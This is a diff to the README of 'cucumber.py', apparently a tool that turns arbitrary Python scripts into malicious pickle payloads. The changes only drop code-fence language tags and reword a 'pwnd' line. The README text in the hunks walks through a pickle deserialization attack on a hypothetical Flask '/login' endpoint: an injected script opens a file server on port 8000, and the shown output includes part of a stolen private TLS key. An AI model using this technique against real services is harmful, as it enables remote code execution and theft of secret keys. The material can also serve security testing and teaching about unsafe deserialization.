@@ -6,7 +6,7 @@ Oelin <me.oelin@gmail.com>.
 
 ### Usage
 
-```sh
+```
 cucumber.py [path]
 ```
  
@@ -20,7 +20,7 @@ serialisation, the original code given will be executed. Note that this script s
 In the following example, a script to start a HTTP web server on port 8000 is crafted into a pickle serialisation. When subject to `pickle.loads()` (i.e by a vulnerable program), the script will be executed. The script can also be found in this repository at
 `./scripts/httpd.py`.
 
-```bash
+```
 $ ls
 httpd.py
 $ ./cucumber.py httpd.py > httpd.pickle
@@ -29,7 +29,7 @@ httpd.py httpd.pickle
 ```
 After the exploitative serialisation has been created, it can be used to test target programs for vulnerabilities, namely those which do not perform adequate input validation. Shown below, is a hypothetical scenareo where an attacker manages to obtain the private TLS key of a Flask web server. The API endpoint `/login` does not provide validation of input data yet at some point invokes `pickle.loads()` on said data. By sending `httpd.pickle` as input, the endpoint willingly transfers control to the malicious script which will start a second web server on port 8000. The attacker may then connect over port 8000 to read arbitrary files, including usually private ones.
 
-```bash
+```
 $ curl https://api.alice.com/robots.txt
 User-agent: *
 Disallow: /users
@@ -101,5 +101,5 @@ vefy74c1qNFFi6JId3zkjFnTK0b+o1JsLLE9CFUOsJfOQuHDgCDMwSadcO6cdkxp
 69cRB+4sChk3oWcFv7E8/euY
 -----END PRIVATE KEY-----
 $
-$ # PWND!
+$ Alice has been pwnd!
 ```
